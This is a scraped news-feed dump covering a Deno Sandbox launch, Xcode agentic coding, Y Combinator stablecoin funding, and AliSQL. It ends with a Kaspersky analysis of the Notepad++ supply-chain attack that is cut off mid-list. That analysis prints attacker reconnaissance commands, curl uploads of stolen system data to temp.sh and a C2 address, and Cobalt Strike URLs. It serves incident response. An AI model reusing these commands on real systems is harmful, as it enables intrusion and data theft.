    &lt;p&gt;This isn’t the traditional “run untrusted plugins” problem. It’s deeper: LLM-generated code, calling external APIs with real credentials, without human review. Sandboxing the compute isn’t enough. You need to control network egress and protect secrets from exfiltration.&lt;/p&gt;
    &lt;p&gt;Deno Sandbox provides both. And when the code is ready, you can deploy it directly to Deno Deploy without rebuilding.&lt;/p&gt;
    &lt;head rend="h2"&gt;Sandboxes?&lt;/head&gt;
    &lt;p&gt;You don’t want to run untrusted code (generated by your LLMs, your users LLMs, or even hand written by users) directly on your server. It will compromise your system, steal your API keys, and call out to evil.com. You need isolation.&lt;/p&gt;
    &lt;p&gt;Deno Sandbox gives you lightweight Linux microVMs (running in the Deno Deploy cloud) to run untrusted code with defense-in-depth security. You create or programmatically via our JavaScript or Python SDKs, and they boot in under a second. You can also interact with them via SSH, HTTP, or even open a VS Code window directly into the sandbox.&lt;/p&gt;
    &lt;code&gt;import { Sandbox } from "@deno/sandbox";

await using sandbox = await Sandbox.create();
await sandbox.sh`ls -lh /`;&lt;/code&gt;
    &lt;head rend="h2"&gt;Secrets That Can’t Be Stolen&lt;/head&gt;
    &lt;p&gt;But there is more. In Deno Sandbox, secrets never enter the environment. Code sees only a placeholder:&lt;/p&gt;
    &lt;code&gt;import { Sandbox } from "@deno/sandbox";

await using sandbox = await Sandbox.create({
  secrets: {
    OPENAI_API_KEY: {
      hosts: ["api.openai.com"],
      value: process.env.OPENAI_API_KEY,
    },
  },
});

await sandbox.sh`echo $OPENAI_API_KEY`;
// DENO_SECRET_PLACEHOLDER_b14043a2f578cba75ebe04791e8e2c7d4002fd0c1f825e19...&lt;/code&gt;
    &lt;p&gt;The real key materializes only when the sandbox makes an outbound request to an approved host. If prompt-injected code tries to exfiltrate that placeholder to &lt;code&gt;evil.com&lt;/code&gt;? Useless.&lt;/p&gt;
    &lt;head rend="h2"&gt;Network Egress Control&lt;/head&gt;
    &lt;p&gt;You can also restrict which hosts the sandbox can talk to:&lt;/p&gt;
    &lt;code&gt;await using sandbox = await Sandbox.create({
  allowNet: ["api.openai.com", "*.anthropic.com"],
});&lt;/code&gt;
    &lt;p&gt;Any request to an unlisted host gets blocked at the VM boundary.&lt;/p&gt;
    &lt;p&gt;Both features are implemented via an outbound proxy similar to coder/httpjail. This gives us a chokepoint for policy enforcement. We plan to add more capabilities here: analytics for outbound connections and programmatic hooks for trusted code to inspect or modify requests.&lt;/p&gt;
    &lt;p&gt;If you’re running untrusted JavaScript or TypeScript, combine this with Deno’s &lt;code&gt;--allow-net&lt;/code&gt; flag for defense in depth: VM-level network restrictions plus
runtime-level permissions.&lt;/p&gt;
    &lt;head rend="h2"&gt;Sandbox to Production&lt;/head&gt;
    &lt;p&gt;&lt;code&gt;sandbox.deploy()&lt;/code&gt; deploys code from your sandbox directly to Deno Deploy.&lt;/p&gt;
    &lt;code&gt;const build = await sandbox.deploy("my-app", {
  production: true,
  build: { mode: "none", entrypoint: "server.ts" },
});

const revision = await build.done;
console.log(revision.url);&lt;/code&gt;
    &lt;p&gt;One call to go from sandbox to production deployment. No rebuilding in a different CI system, no re-authenticating with a different tool. Just turn your dev environment directly into a production ready, auto-scaling serverless deployment.&lt;/p&gt;
    &lt;head rend="h2"&gt;Persistence&lt;/head&gt;
    &lt;p&gt;Sandboxes are ephemeral by default, but when you need state we have you covered:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Volumes: read-write storage for caches, databases, user data&lt;/item&gt;
      &lt;item&gt;Snapshots: read-only images for pre-installed toolchains and volume base&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Run &lt;code&gt;apt-get install&lt;/code&gt; once, snapshot it, and every future sandbox boots with
everything already installed. Create read-write volumes from the snapshots to
create a fresh development environment in seconds.&lt;/p&gt;
    &lt;head rend="h2"&gt;Technical Details&lt;/head&gt;
    &lt;table&gt;
      &lt;row span="2"&gt;
        &lt;cell role="head"&gt;Spec&lt;/cell&gt;
        &lt;cell role="head"&gt;Value&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Regions&lt;/cell&gt;
        &lt;cell&gt;Amsterdam, Chicago&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;vCPUs&lt;/cell&gt;
        &lt;cell&gt;2&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Memory&lt;/cell&gt;
        &lt;cell&gt;768 MB - 4 GB&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Lifetime&lt;/cell&gt;
        &lt;cell&gt;Ephemeral or timeout (supports extending on demand)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Max lifetime&lt;/cell&gt;
        &lt;cell&gt;30 minutes&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Boot time&lt;/cell&gt;
        &lt;cell&gt;&amp;lt; 1 second&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Perfect for AI agents executing code, vibe-coding environments, secure plugin systems, ephemeral CI runners, and customer-supplied code.&lt;/p&gt;
    &lt;head rend="h2"&gt;Pricing&lt;/head&gt;
    &lt;p&gt;Deno Sandbox is included in your Deno Deploy plan with competitive, usage-based pricing. You pay for compute time, not wall-clock time.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;$0.05/h CPU time (40h included with Pro)&lt;/item&gt;
      &lt;item&gt;$0.016/GB-h memory (1000 GB-h included with Pro)&lt;/item&gt;
      &lt;item&gt;$0.20/GiB-month volume storage (5 GiB included with Pro)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Enterprise pricing available—contact deploy@deno.com.&lt;/p&gt;
    &lt;head rend="h2"&gt;Get Started&lt;/head&gt;
    &lt;p&gt;Deno Sandbox launches in beta today, alongside the general availability of Deno Deploy.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Landing page: deno.com/sandbox&lt;/item&gt;
      &lt;item&gt;Docs: docs.deno.com/sandbox&lt;/item&gt;
      &lt;item&gt;JavaScript SDK: jsr.io/@deno/sandbox or npm&lt;/item&gt;
      &lt;item&gt;Python SDK: pypi.org/project/deno-sandbox&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;We’re excited to see what you (or your AI agents) build with Deno Sandbox.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46874097</guid><pubDate>Tue, 03 Feb 2026 17:33:20 +0000</pubDate></item><item><title>Xcode 26.3 – Developers can leverage coding agents directly in Xcode</title><link>https://www.apple.com/newsroom/2026/02/xcode-26-point-3-unlocks-the-power-of-agentic-coding/</link><description>&lt;doc fingerprint="bd64c349434690ed"&gt;
  &lt;main&gt;
    &lt;p&gt; UPDATE February 3, 2026 &lt;/p&gt;
    &lt;head rend="h1"&gt;Xcode 26.3 unlocks the power of agentic coding&lt;/head&gt;
    &lt;p&gt; Developers can leverage coding agents, including Anthropic’s Claude Agent and OpenAI’s Codex, directly in Xcode to tackle complex tasks autonomously, helping them develop apps faster than ever &lt;/p&gt;
    &lt;p&gt;Xcode 26.3 introduces support for agentic coding, a new way in Xcode for developers to build apps using coding agents such as Anthropic’s Claude Agent and OpenAI’s Codex. With agentic coding, Xcode can work with greater autonomy toward a developer’s goals — from breaking down tasks to making decisions based on the project architecture and using built-in tools. &lt;/p&gt;
    &lt;p&gt;Expanding on the intelligence features introduced in Xcode 26, which brought a brand-new coding assistant for writing and editing in Swift, this release gives coding agents access to even more of Xcode’s capabilities. Agents like Claude Agent and Codex can now collaborate throughout the entire development life cycle, giving developers the power to streamline workflows, iterate faster, and bring ideas to life like never before. Agents can search documentation, explore file structures, update project settings, and verify their work visually by capturing Xcode Previews and iterating through builds and fixes. &lt;/p&gt;
    &lt;p&gt;“At Apple, our goal is to make tools that put industry-leading technologies directly in developers’ hands so they can build the very best apps,” said Susan Prescott, Apple’s vice president of Worldwide Developer Relations. “Agentic coding supercharges productivity and creativity, streamlining the development workflow so developers can focus on innovation.” &lt;/p&gt;
    &lt;p&gt;With seamless access to Claude Agent and Codex, developers can bring the advanced reasoning of these models directly into their app-building workflow.1 This connection combines the power of these agents with Xcode’s native capabilities to provide the best results when developing for Apple platforms, giving developers the flexibility to work with the model that best fits their project. &lt;/p&gt;
    &lt;p&gt;In addition to these built-in integrations, Xcode 26.3 makes its capabilities available through the Model Context Protocol, an open standard that gives developers the flexibility to use any compatible agent or tool with Xcode. &lt;/p&gt;
    &lt;p&gt;Availability &lt;/p&gt;
    &lt;p&gt;Xcode 26.3 is available as a release candidate for all members of the Apple Developer Program starting today, with a release coming soon on the App Store. &lt;/p&gt;
    &lt;p&gt;Share article&lt;/p&gt;
    &lt;head rend="h2"&gt;Media&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;Text of this article&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Images in this article&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Anthropic and OpenAI’s terms of service may apply.&lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46874619</guid><pubDate>Tue, 03 Feb 2026 18:04:08 +0000</pubDate></item><item><title>Y Combinator will let founders receive funds in stablecoins</title><link>https://fortune.com/2026/02/03/famed-startup-incubator-y-combinator-to-let-founders-receive-funds-in-stablecoins/</link><description>&lt;doc fingerprint="311217d330869b23"&gt;
  &lt;main&gt;
    &lt;p&gt;In the latest sign of digital currencies going mainstream, Silicon Valley’s most prominent startup incubator will allow its spring cohort of entrepreneurs to receive their funding in stablecoins. Y Combinator, whose alumni include the founders of Airbnb and DoorDash, announced on Tuesday that founders can opt to receive their customary allotment—typically around $500,000—in the Circle-issued USDC.&lt;/p&gt;
    &lt;p&gt;Startup founders who choose stablecoins can choose to receive the tokens on various blockchains such as Ethereum and Solana, Nemil Dalal, a visiting partner at Y Combinator who focuses on crypto, told Fortune. He added that Y Combinator may expand to other stablecoins depending on demand.&lt;/p&gt;
    &lt;p&gt;“Stablecoins is one of the key pillars for us,” Dalal said, referring to one of the areas where Y Combinator would like to see more startup ideas. “So we just want to live and breathe that as well.”&lt;/p&gt;
    &lt;head rend="h2"&gt;Price agnostic&lt;/head&gt;
    &lt;p&gt;While many crypto venture capitalists have let the startups in their portfolio take funding from stablecoins for some time, more traditional tech investors haven’t given that opportunity to founders. Dalal, for example, said he wasn’t aware of any legacy VCs who offer that option. “We’re excited for a world where, in the future, we think a lot of startups will eventually start raising capital on-chain,” he said.&lt;/p&gt;
    &lt;p&gt;Stablecoins have been around for more than a decade, but historically, their adoption was primarily limited to crypto traders seeking a non-volatile asset in which to park profits. In the past two years, however, stablecoins have burst into the headlines following a push by Wall Street and corporations that view the assets as a faster and more inexpensive way to move money around.&lt;/p&gt;
    &lt;p&gt;Big Tech has taken notice, especially after President Donald Trump signed into law in July a bill regulating the crypto assets. The fintech giant Stripe completed a $1.1 billion acquisition of stablecoin startup Bridge in February 2025 and has since backed its own blockchain designed for stablecoin transactions. The cloud infrastructure company Cloudflare announced its intention to launch its own stablecoin in September. And the buy-now, pay-later firm Klarna launched its own token as well in November.&lt;/p&gt;
    &lt;p&gt;Those announcements largely came during a more bullish crypto market that saw Bitcoin and other tokens notch all-time highs. Now, sentiment has soured as the world’s largest cryptocurrency nears monthslong lows. But, Dalal, the visiting partner at Y Combinator, said that bearish outlook doesn’t apply to stablecoins. “The excitement on stablecoins is just growing,” he said. “It’s actually agnostic of prices.”&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46875033</guid><pubDate>Tue, 03 Feb 2026 18:28:48 +0000</pubDate></item><item><title>AliSQL: Alibaba's open-source MySQL with vector and DuckDB engines</title><link>https://github.com/alibaba/AliSQL</link><description>&lt;doc fingerprint="3f90b0c4553671e2"&gt;
  &lt;main&gt;
    &lt;p&gt;AliSQL is Alibaba's MySQL branch, forked from official MySQL and used extensively in Alibaba Group's production environment. It includes various performance optimizations, stability improvements, and features tailored for large-scale applications.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Quickly build your DuckDB node: How to set up a DuckDB node&lt;/p&gt;
    &lt;/quote&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;AliSQL Version: 8.0.44 (LTS)&lt;/item&gt;
      &lt;item&gt;Based on: MySQL 8.0.44&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;DuckDB Storage Engine:AliSQL integrates DuckDB as a native storage engine, allowing users to operate DuckDB with the same experience as MySQL. By leveraging AliSQL for rapid deployment of DuckDB service nodes, users can easily achieve lightweight analytical capabilities.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Vector Storage:AliSQL natively supports enterprise-grade vector processing for up to 16,383 dimensions. By integrating a highly optimized HNSW algorithm for high-performance Approximate Nearest Neighbor (ANN) search, AliSQL empowers users to build AI-driven applications—such as semantic search and recommendation systems—seamlessly using standard SQL interfaces.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;DDL Optimization (planned):AliSQL delivers a faster, safer, and lighter DDL experience through innovations such as enhanced Instant DDL, parallel B+tree construction, a non-blocking lock mechanism, and real-time DDL apply—significantly improving schema change efficiency and virtually eliminating replication lag.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;RTO Optimization (planned):AliSQL deeply optimizes the end-to-end crash recovery path to accelerate instance startup, shorten RTO, and restore service quickly.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Replication Optimization (planned): AliSQL significantly boosts replication throughput and minimizes lag by implementing Binlog Parallel Flush, Binlog in Redo, and specialized optimizations for large transactions and DDL operations.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Prerequisites:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;CMake 3.x or higher&lt;/item&gt;
      &lt;item&gt;Python3&lt;/item&gt;
      &lt;item&gt;C++17 compliant compiler (GCC 7+ or Clang 5+)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Build Instructions:&lt;/p&gt;
    &lt;code&gt;# Clone the repository
git clone https://github.com/alibaba/AliSQL.git
cd AliSQL

# Build the project (release build)
sh build.sh -t release -d /path/to/install/dir

# For development/debugging (debug build)
sh build.sh -t debug -d /path/to/install/dir

# Install the built MySQL server
make install&lt;/code&gt;
    &lt;p&gt;Build Options:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;-t release|debug&lt;/code&gt;: Build type (default: debug)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;-d &amp;lt;dest_dir&amp;gt;&lt;/code&gt;: Installation directory (default: /usr/local/alisql or $HOME/alisql)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;-s &amp;lt;server_suffix&amp;gt;&lt;/code&gt;: Server suffix (default: alisql-dev)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;-g asan|tsan&lt;/code&gt;: Enable sanitizer&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;-c&lt;/code&gt;: Enable GCC coverage (gcov)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;-h, --help&lt;/code&gt;: Show help&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;GitHub Issues: https://github.com/alibaba/AliSQL/issues&lt;/item&gt;
      &lt;item&gt;Alibaba Cloud RDS: DuckDB-based Analytical Instance&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;
      &lt;p&gt;For DuckDB-specific support, see the DuckDB Support Options.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;AliSQL 8.0 became an open-source project in December 2025 and is actively maintained by engineers at Alibaba Group.&lt;/p&gt;
    &lt;p&gt;Contributions are welcome! Please:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Fork the repository&lt;/item&gt;
      &lt;item&gt;Create a feature branch&lt;/item&gt;
      &lt;item&gt;Make your changes with appropriate tests&lt;/item&gt;
      &lt;item&gt;Submit a pull request&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;For bug reports and feature requests, please use the GitHub Issues page.&lt;/p&gt;
    &lt;p&gt;This project is licensed under the GPL-2.0 license. See the LICENSE file for details.&lt;/p&gt;
    &lt;p&gt;AliSQL is based on MySQL, which is licensed under GPL-2.0. The DuckDB integration follows the same licensing terms.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46875228</guid><pubDate>Tue, 03 Feb 2026 18:40:18 +0000</pubDate></item><item><title>Data centers in space makes no sense</title><link>https://civai.org/blog/space-data-centers</link><description></description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46876105</guid><pubDate>Tue, 03 Feb 2026 19:37:30 +0000</pubDate></item><item><title>FlashAttention-T: Towards Tensorized Attention</title><link>https://dl.acm.org/doi/10.1145/3774934.3786425</link><description></description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46877403</guid><pubDate>Tue, 03 Feb 2026 21:15:48 +0000</pubDate></item><item><title>Notepad++ supply chain attack breakdown</title><link>https://securelist.com/notepad-supply-chain-attack/118708/</link><description>&lt;doc fingerprint="bde39993f10d8e27"&gt;
  &lt;main&gt;
    &lt;head rend="h2"&gt;Introduction&lt;/head&gt;
    &lt;p&gt;On February 2, 2026, the developers of Notepad++, a text editor popular among developers, published a statement claiming that the update infrastructure of Notepad++ has been compromised. According to the statement, this was due to a hosting provider level incident, which occurred from June to September 2025. However, attackers were able to retain access to internal services until December 2025.&lt;/p&gt;
    &lt;head rend="h2"&gt;Multiple execution chains and payloads&lt;/head&gt;
    &lt;p&gt;Having checked our telemetry related to this incident, we have been amazed to find out how different and unique were the execution chains used in this supply chain attack. We identified that over the course of four months, from July to October 2025, attackers who have compromised Notepad++ have been constantly rotating C2 server addresses used for distributing malicious updates, the downloaders used for implant delivery, as well as the final payloads.&lt;/p&gt;
    &lt;p&gt;We observed three different infection chains overall designed to attack about a dozen machines, belonging to:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Individuals located in Vietnam, El Salvador and Australia;&lt;/item&gt;
      &lt;item&gt;A government organization located in the Philippines;&lt;/item&gt;
      &lt;item&gt;A financial organization located in El Salvador;&lt;/item&gt;
      &lt;item&gt;An IT service provider organization located in Vietnam.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Despite the variety of payloads observed, Kaspersky solutions have been able to block the identified attacks as they occurred.&lt;/p&gt;
    &lt;p&gt;In this article, we describe the variety of the infection chains we observed in the Notepad++ supply chain attack, as well as provide numerous previously unpublished IoCs related to it.&lt;/p&gt;
    &lt;head rend="h3"&gt;Chain #1 — late July and early August 2025&lt;/head&gt;
    &lt;p&gt;We observed attackers to deploy a malicious Notepad++ update for the first time in late July 2025. It was hosted at http://45.76.155[.]202/update/update.exe. Notably, the first scan of this URL on the VirusTotal platform occurred in late September, by a user from Taiwan.&lt;/p&gt;
    &lt;p&gt;The &lt;code&gt;update.exe&lt;/code&gt; file downloaded from this URL (SHA1: 8e6e505438c21f3d281e1cc257abdbf7223b7f5a) was launched by the legitimate Notepad++ updater process, &lt;code&gt;GUP.exe&lt;/code&gt;. This file turned out to be a NSIS installer, of about 1 MB in size. When started, it sends a heartbeat containing system information to the attackers. This is done through the following steps:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;The file creates a directory named &lt;code&gt;%appdata%\ProShow&lt;/code&gt;and sets it as the current directory;&lt;/item&gt;
      &lt;item&gt;It executes the shell command &lt;code&gt;cmd /c whoami&amp;amp;&amp;amp;tasklist &amp;gt; 1.txt&lt;/code&gt;, thus creating a file with the shell command execution results in the&lt;code&gt;%appdata%\ProShow&lt;/code&gt;directory;&lt;/item&gt;
      &lt;item&gt;Then it uploads the &lt;code&gt;1.txt&lt;/code&gt;file to the temp[.]sh hosting service by executing the&lt;code&gt;curl.exe -F "file=@1.txt" -s https://temp.sh/upload&lt;/code&gt;command;&lt;/item&gt;
      &lt;item&gt;Next, it sends the URL to the uploaded &lt;code&gt;1.txt&lt;/code&gt;file by using the&lt;code&gt;curl.exe --user-agent "https://temp.sh/ZMRKV/1.txt" -s http://45.76.155[.]202&lt;/code&gt;shell command. As can be observed, the uploaded file URL is transferred inside the user agent.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Notably, the same behavior of malicious Notepad++ updates, specifically the launch of shell commands and the use of the temp[.]sh website for file uploading, has been described on the Notepad++ community forums by a user named soft-parsley.&lt;lb/&gt; After sending system information, the &lt;code&gt;update.exe&lt;/code&gt; file executes the second-stage payload. To do that, it performs the following actions: &lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Drops the following files to the &lt;code&gt;%appdata%\ProShow&lt;/code&gt;directory:&lt;list rend="ul"&gt;&lt;item&gt;&lt;code&gt;ProShow.exe&lt;/code&gt;(SHA1: defb05d5a91e4920c9e22de2d81c5dc9b95a9a7c)&lt;/item&gt;&lt;item&gt;&lt;code&gt;defscr&lt;/code&gt;(SHA1: 259cd3542dea998c57f67ffdd4543ab836e3d2a3)&lt;/item&gt;&lt;item&gt;&lt;code&gt;if.dnt&lt;/code&gt;(SHA1: 46654a7ad6bc809b623c51938954de48e27a5618)&lt;/item&gt;&lt;item&gt;&lt;code&gt;proshow.crs&lt;/code&gt;(SHA1: da39a3ee5e6b4b0d3255bfef95601890afd80709)&lt;/item&gt;&lt;item&gt;&lt;code&gt;proshow.phd&lt;/code&gt;(SHA1: da39a3ee5e6b4b0d3255bfef95601890afd80709)&lt;/item&gt;&lt;item&gt;&lt;code&gt;proshow_e.bmp&lt;/code&gt;(SHA1: 9df6ecc47b192260826c247bf8d40384aa6e6fd6)&lt;/item&gt;&lt;item&gt;&lt;code&gt;load&lt;/code&gt;(SHA1: 06a6a5a39193075734a32e0235bde0e979c27228)&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;Executes the dropped &lt;code&gt;ProShow.exe&lt;/code&gt;file.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The launched &lt;code&gt;ProShow.exe&lt;/code&gt; file is a legitimate ProShow software, which is abused to launch a malicious payload. Normally, when threat actors aim to execute a malicious payload inside a legitimate process, they resort to the DLL sideloading technique. However, this time attackers have decided to avoid using it — likely due to how much attention this technique receives nowadays. Instead, they abused an old, known vulnerability in the ProShow software, which dates back to early 2010s. The dropped file named &lt;code&gt;load&lt;/code&gt; contains an exploit payload, which is launched when the &lt;code&gt;ProShow.exe&lt;/code&gt; file is launched. It is worth noting that, apart from this payload, all files in the &lt;code&gt;%appdata%\ProShow&lt;/code&gt; directory are legitimate.&lt;/p&gt;
    &lt;p&gt;Analysis of the exploit payload revealed that it contains two shellcodes — one at the very start and the other one in the middle of the file. The shellcode located at the start of the file contains a set of meaningless instructions and is not designed to be executed — rather, attackers used it as the exploit padding bytes. It is likely that, by using a fake shellcode for padding bytes instead of something else (e.g., a sequence of &lt;code&gt;0x41&lt;/code&gt; characters or random bytes), attackers aimed to confuse researchers and automated analysis systems. &lt;/p&gt;
    &lt;p&gt;The second shellcode, which is stored in the middle of the file, is the one that is launched when &lt;code&gt;ProShow.exe&lt;/code&gt; is started. It decrypts a Metasploit downloader payload that retrieves a Cobalt Strike Beacon shellcode from the URL https://45.77.31[.]210/users/admin (user agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36) and launches it. &lt;/p&gt;
    &lt;p&gt;The Cobalt Strike Beacon payload is designed to communicate with the cdncheck.it[.]com C2 server. For instance, it uses the GET request URL https://45.77.31[.]210/api/update/v1 and the POST request URL https://45.77.31[.]210/api/FileUpload/submit.&lt;/p&gt;
    &lt;p&gt;Later on, in early August 2025, we have observed attackers to use the same download URL for the &lt;code&gt;update.exe&lt;/code&gt; files (observed SHA1 hash: 90e677d7ff5844407b9c073e3b7e896e078e11cd), as well as the same execution chain for delivery of Cobalt Strike Beacon via malicious Notepad++ updates. However, we noted the following differences:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;In the Metasploit downloader payload, the URL for downloading Cobalt Strike Beacon was set to https://cdncheck.it[.]com/users/admin;&lt;/item&gt;
      &lt;item&gt;The Cobalt Strike C2 server URLs were set to https://cdncheck.it[.]com/api/update/v1 and https://cdncheck.it[.]com/api/Metadata/submit.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;We have not further seen any infections leveraging chain #1 after early August 2025.&lt;/p&gt;
    &lt;head rend="h3"&gt;Chain #2 — middle and end of September 2025&lt;/head&gt;
    &lt;p&gt;A month and a half after malicious update detections ceased, we observed attackers to resume deploying these updates in the middle of September 2025, using another infection chain. The malicious update was still being distributed from the http://45.76.155[.]202/update/update.exe URL, and the file downloaded from it (SHA1 hash: 573549869e84544e3ef253bdba79851dcde4963a) was an NSIS installer as well. However, its file size was now about 140 KB. Again, this file performed two actions:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Obtained system information by executing a shell command and uploading its execution results to temp[.]sh;&lt;/item&gt;
      &lt;item&gt;Dropped a next-stage payload on disk and launched it.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Regarding system information, attackers made the following changes to how it was collected:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;They changed the working directory to %APPDATA%\Adobe\Scripts;&lt;/item&gt;
      &lt;item&gt;They started collecting more system information details, changing the executed shell command to &lt;code&gt;cmd /c "whoami&amp;amp;&amp;amp;tasklist&amp;amp;&amp;amp;systeminfo&amp;amp;&amp;amp;netstat -ano" &amp;gt; a.txt&lt;/code&gt;.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The created &lt;code&gt;a.txt&lt;/code&gt; file was, just as in the case of stage #1, uploaded to the temp[.]sh website through curl, with the obtained temp[.]sh URL being transferred to the same http://45.76.155[.]202/list endpoint, inside the User-Agent header.&lt;/p&gt;
    &lt;p&gt;As for the next-stage payload, it has been changed completely. The NSIS installer was configured to drop the following files to the %APPDATA%\Adobe\Scripts directory:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;alien.dll&lt;/code&gt;(SHA1: 6444dab57d93ce987c22da66b3706d5d7fc226da);&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;lua5.1.dll&lt;/code&gt;(SHA1: 2ab0758dda4e71aee6f4c8e4c0265a796518f07d);&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;script.exe&lt;/code&gt;(SHA1: bf996a709835c0c16cce1015e6d44fc95e08a38a);&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;alien.ini&lt;/code&gt;(SHA1: ca4b6fe0c69472cd3d63b212eb805b7f65710d33).&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Next, it executes the following shell command to launch the script.exe file: &lt;code&gt;%APPDATA%\%Adobe\Scripts\script.exe %APPDATA%\Adobe\Scripts\alien.ini&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;All of the files in the &lt;code&gt;%APPDATA%\Adobe\Scripts&lt;/code&gt; directory, except for &lt;code&gt;alien.ini&lt;/code&gt;, are legitimate and related to the Lua interpreter. As such, the previously mentioned command is used by attackers to launch a compiled Lua script, located in the &lt;code&gt;alien.ini&lt;/code&gt; file.  Below is a screenshot of its decompilation:&lt;lb/&gt; As we can see, this small script is used for placing shellcode inside executable memory and then launching it through the &lt;code&gt;EnumWindowStationsW&lt;/code&gt; API function.&lt;/p&gt;
    &lt;p&gt;The launched shellcode is, just in the case of chain #1, a Metasploit downloader, which downloads a Cobalt Strike Beacon payload, again in the form of a shellcode, from the https://cdncheck.it[.]com/users/admin URL.&lt;/p&gt;
    &lt;p&gt;The Cobalt Strike payload contains the C2 server URLs that slightly differ from the ones seen previously: https://cdncheck.it[.]com/api/getInfo/v1 and https://cdncheck.it[.]com/api/FileUpload/submit.&lt;/p&gt;
    &lt;p&gt;Attacks involving chain #2 continued until the end of September, when we observed two more malicious &lt;code&gt;update.exe&lt;/code&gt; files. One of them had the SHA1 hash 13179c8f19fbf3d8473c49983a199e6cb4f318f0. The Cobalt Strike Beacon payload delivered through it was configured to use the same URLs observed in mid-September, however, attackers changed the way system information was collected. Specifically, attackers split the single shell command they used for this (&lt;code&gt;cmd /c "whoami&amp;amp;&amp;amp;tasklist&amp;amp;&amp;amp;systeminfo&amp;amp;&amp;amp;netstat -ano" &amp;gt; a.txt&lt;/code&gt;) into multiple commands:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;code&gt;cmd /c whoami &amp;gt;&amp;gt; a.txt&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;cmd /c tasklist &amp;gt;&amp;gt; a.txt&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;cmd /c systeminfo &amp;gt;&amp;gt; a.txt&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
